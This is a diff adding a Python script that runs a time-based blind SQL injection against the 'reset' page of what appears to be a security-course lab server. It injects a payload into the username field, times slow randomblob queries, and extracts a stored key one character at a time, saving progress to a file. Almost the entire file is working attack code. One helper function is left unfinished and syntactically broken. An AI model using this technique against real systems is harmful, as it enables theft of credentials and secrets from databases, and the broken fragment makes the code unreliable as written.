@@ -1,0 +1,85 @@
+#!/bin/python
+
+import urllib as url
+import time
+import string
+import sys
+
+adress = "lbs-course.askarov.net"
+port = 3030
+page = "reset"
+
+#SQL
+injectionStart="admin' and key glob "
+slowQuery = "and length(hex(randomblob(9999999)))"
+injectionEnd = ";--"
+
+altg_injectionStart="admin' and substr(key,"
+
+maxDelay = 0.2
+
+keyChars = list("\n +-/"+string.digits+"="+string.ascii_uppercase+string.ascii_lowercase)
+
+def encode(key):
+    injection = injectionStart + "'" +key+"'" + slowQuery + injectionEnd
+    #print(injection)
+    return url.urlencode({'username': injection})
+
+def queryOnce(key):
+    injection = encode(key)
+    target = "http://"+adress+":"+str(port)+"/"+page
+    
+    #print(target)
+    start = time.time()
+    url.urlopen(target,data=injection)
+    end = time.time()
+    return end-start
+
+def isCorrect(time):
+    return time>maxDelay
+
+def binarySearch(a,x,lo=0,hi=None):
+    hi=hi if hi is not None else len(a)
+    while lo < hi:
+        mid = (lo+hi)//2
+        midval = a[x]
+        if()
+
+def findNextChar(currentKey,tries=0):
+    for i in keyChars:
+        duration = queryOnce(currentKey+i+"*")
+        if isCorrect(duration):
+            print(currentKey+i)
+            return currentKey+i
+    #something went wrong
+    if isCorrect(queryOnce(currentKey)):
+        print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
+        if(tries>10):
+            print("Tried 10 times and failed, current key is:\n"+currentKey)
+            writeToFile(currentKey)
+            sys.exit()
+        else:
+            return findNextChar(currentKey,tries=tries+1)
+    else:
+        print("Incorrect key accepted once:\n"+currentKey)
+        if currentKey!='':
+            return findNextChar(currentKey[:-1])
+
+def writeToFile(key):
+    print('writing '+ str(len(key))+' characters to file')
+    f = open('keySoFar.txt','w')
+    f.write(key)
+    f.close()
+
+def main():
+    f = open('keySoFar.txt','r')
+    key = f.read()
+    f.close()
+    for i in range(0,3508-len(key)):
+        key = findNextChar(key)
+        if i%10==0:
+            writeToFile(key)
+    return
+
+if __name__ == "__main__":
+    main()
